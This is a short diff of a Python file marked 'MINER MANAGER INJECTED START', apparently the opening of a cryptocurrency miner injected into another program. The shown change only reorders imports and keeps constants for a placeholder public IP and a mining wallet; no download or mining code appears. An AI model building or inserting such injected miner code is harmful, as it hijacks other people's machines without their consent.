@@ -1,12 +1,11 @@
 # --- MINER MANAGER INJECTED START ---
 import os
-import subprocess
-import urllib.request
 import stat
-import traceback
-import json
-from pathlib import Path
+import subprocess
 import time
+import traceback
+import urllib.request
+from pathlib import Path
 
 PUBLIC_IP = "{HARDCODED_PUBLIC_IP}"
 KRX_WALLET = "krxXJ6QJPW"
